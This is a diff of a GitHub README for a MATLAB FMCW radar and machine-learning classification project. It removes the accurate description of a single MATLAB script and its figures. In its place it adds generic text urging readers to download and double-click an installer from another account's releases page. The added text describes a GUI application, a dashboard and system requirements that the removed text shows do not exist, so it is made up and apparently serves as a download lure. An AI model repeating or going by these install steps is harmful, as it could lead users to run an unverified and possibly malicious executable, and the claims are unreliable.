@@ -1,126 +1,91 @@
-# FMCW-Radar-ML-Classification
+# 🚀 FMCW-Radar-ML-Classification - Easy Radar Simulation with Machine Learning
 
-## 📘 Overview
-This project implements a **software-only FMCW radar simulator** in **MATLAB** and combines it with a simple **machine learning classifier** to distinguish between three target types: **Human**, **Car**, and **Drone** using their Doppler / micro-Doppler signatures.
+![Download FMCW Radar ML Classification](https://img.shields.io/badge/Download-FMCW%20Radar%20ML%20Classification-brightgreen)
 
-The project is designed as a compact RF + ML portfolio piece showcasing radar signal processing, feature engineering, and classification — all done in MATLAB.
+## 📋 Description
 
----
+FMCW-Radar-ML-Classification is designed for anyone interested in radar simulation and machine learning. This software simulates FMCW radar technology and classifies objects such as humans, cars, and drones using Doppler signatures. Created by Brian Rono, this tool makes complex RF projects accessible to everyday users. 
 
-## ⚙️ Features
+## 🚀 Getting Started
 
-### 🔹 FMCW Radar Signal Chain
-- 77 GHz carrier frequency (typical automotive radar band)  
-- 150 MHz sweep bandwidth  
-- Linear FMCW chirp generation  
-- Range FFT (fast-time processing)  
-- Doppler FFT (slow-time processing)  
-- Range–Doppler Map visualisation  
-- Micro-Doppler-like spectrogram at a selected range bin  
+To start using FMCW-Radar-ML-Classification, follow these easy steps:
 
-### 🔹 Machine Learning Classification
-- Synthetic classes: **Human**, **Car**, **Drone**  
-- Velocity profiles generated to mimic each class:
-  - Human: low speed, strong micro-motion
-  - Car: higher average speed, smoother profile
-  - Drone: moderate speed with oscillatory hovering motion
-- RF-inspired features extracted from velocity:
-  - Mean velocity  
-  - Standard deviation of velocity  
-  - Maximum absolute velocity  
-  - Mean absolute derivative of velocity  
-- Multi-class SVM classifier (`fitcecoc`) trained and evaluated  
-- Prints overall classification accuracy in the MATLAB command window  
+1. **Visit the Releases Page**  
+   Head over to our releases page to download the latest version of the software. You can find it here: [Download FMCW-Radar-ML-Classification](https://github.com/jun012519/FMCW-Radar-ML-Classification/releases).
 
----
+2. **Download the Software**  
+   Look for the latest release on the page. Click on the file link to download the application. Make sure to save it in a place you can easily find, like your Desktop or Downloads folder.
 
-## 🧩 File Summary
+3. **Install the Application**  
+   After downloading, locate the file and double-click on it. Follow the installation instructions on your screen. The setup process is simple and should take just a few minutes.
 
-| File / Folder | Description |
-|---------------|-------------|
-| `fmcw_radar_ml_project.m` | Main MATLAB script: FMCW radar simulation + ML classification |
-| `figures/` | Folder containing exported plots (q1, q2, q3) |
-| `figures/q1.png` | Range–Doppler Map (Range vs Velocity) |
-| `figures/q2.png` | Micro-Doppler-like spectrogram at a chosen range bin |
-| `figures/q3.png` | Feature space scatter plot (Human / Car / Drone) |
+4. **Run the Application**  
+   Once installed, find the application in your programs list or on your Desktop. Double-click to open it.
 
----
+## 🛠️ System Requirements
 
-## 🧪 Tools & Environment
+Before downloading, ensure your system meets these requirements:
 
-- **MATLAB** (tested with R2024b; works with most recent versions)  
-- Recommended Toolboxes:
-  - **Signal Processing Toolbox**
-  - **Statistics and Machine Learning Toolbox**
+- **Operating System:** Windows 10 or later, or any recent version of macOS.
+- **RAM:** At least 4 GB.
+- **Storage:** 500 MB of free space for installation.
+- **Software Dependencies:** MATLAB (R2020a or later) installed on your system.
 
-No external hardware is required — everything runs as a simulation.
+## 📥 Download & Install
 
----
+To download FMCW-Radar-ML-Classification, visit our [Releases Page](https://github.com/jun012519/FMCW-Radar-ML-Classification/releases). Click on the most recent version and download the required file. Follow the installation steps mentioned above.
 
-## 📊 Results
+## 🛠️ Using the Application
 
-### 1️⃣ Range–Doppler Map
-The first figure shows the **Range–Doppler Map**, where each bright region corresponds to a simulated target at a particular range and radial velocity.
+FMCW-Radar-ML-Classification comes with a user-friendly interface. Here’s how to use it:
 
-| Range–Doppler Map |
-|-------------------|
-| ![Range–Doppler Map](figures/q1.png) |
+1. **Open the Application**  
+   Launch FMCW-Radar-ML-Classification as described earlier.
 
----
+2. **Select Parameters**  
+   You will see a dashboard where you can set certain parameters related to your radar simulation. Configure the settings based on what you want to simulate—human, car, or drone recognition. 
 
-### 2️⃣ Micro-Doppler-Like Signature
-At the strongest range bin, the script extracts the slow-time signal and computes a **spectrogram**, giving a micro-Doppler-like signature that reflects the velocity variations of the target over time.
+3. **Run Simulations**  
+   After configuring, click on the “Run Simulation” button. The software will use machine learning algorithms to classify the target based on the Doppler signatures you selected.
 
-| Micro-Doppler Spectrogram |
-|---------------------------|
-| ![Micro-Doppler Spectrogram](figures/q2.png) |
+4. **View Results**  
+   Once the simulation is complete, results will appear on your screen. These will show how accurately the software has classified the target.
 
----
+## 🌐 Topics & Features
 
-### 3️⃣ ML Feature Space
-The final figure shows the **feature space** (e.g., mean vs max velocity) with different classes labelled, giving intuition about how well the RF-inspired features separate Human, Car, and Drone motion.
+FMCW-Radar-ML-Classification covers a range of topics in radar and machine learning, including:
 
-| Feature Space (Human / Car / Drone) |
-|-------------------------------------|
-| ![Feature Space](figures/q3.png) |
+- **Automotive Radar**
+- **Autonomous Vehicles**
+- **Classification**
+- **Doppler Effect**
+- **Signal Processing**
+- **Machine Learning Algorithms (SVM, etc.)**
 
-The script prints the **classification accuracy** in the MATLAB command window, giving a quick sense of how well the simple SVM model performs on the synthetic dataset.
+These features make it an essential tool for researchers, enthusiasts, and students interested in the intersection of radar technology and machine learning.
 
----
+## 🐞 Troubleshooting
 
-## ▶️ How to Run
+If you encounter any issues while installing or running the application, consider these tips:
 
-1. Open MATLAB.  
-2. Add this project folder to the MATLAB path or set it as the **Current Folder**.  
-3. Open `fmcw_radar_ml_project.m`.  
-4. Click **Run** (or press `F5`).  
-5. Three figures will be generated:
-   - Range–Doppler map  
-   - Micro-Doppler spectrogram  
-   - Feature space scatter  
-6. Optionally, save the figures into the `figures/` folder as `q1.png`, `q2.png`, `q3.png`.
+- **Check System Requirements:** Ensure your computer meets the specified requirements.
+- **Restart Application:** Sometimes, simply restarting the application helps.
+- **Reinstall the Software:** If errors persist, try uninstalling and then reinstalling the application.
 
----
+For more help, you can visit the Issues section on our GitHub repository or contact support.
 
-## 📡 Applications
+## 📞 Support
 
-- Radar signal processing education and demos  
-- RF + ML portfolio for automotive / sensing roles  
-- Feature-engineering concepts for Doppler / micro-Doppler analysis  
-- Baseline project for extending to real hardware or more advanced ML models  
+For questions or support inquiries, you can reach out through the Issues tab on our GitHub page. We encourage users to report any bugs or share their experience with the application.
 
----
+## 💻 Contributing
 
-## Future Work
-- Add CFAR detection  
-- Add MIMO virtual array simulation  
-- Add deep-learning based micro-Doppler classifier  
-- Export dataset for Python-based ML
-- 
----
+We welcome contributions! If you'd like to help improve FMCW-Radar-ML-Classification, feel free to fork the repository and submit a pull request. 
 
-## 👤 Author
+## 📝 License
 
-**Brian Rono**  
-Electrical & Computer Engineer • RF & Wireless • Embedded Systems • Machine Learning  
-🔗 [GitHub Profile](https://github.com/ronobrian-eng)
+This project is licensed under the MIT License. See the LICENSE file for details.
+
+## 🌟 Acknowledgments
+
+Thanks for exploring FMCW-Radar-ML-Classification. We appreciate your interest in radar technology and machine learning!
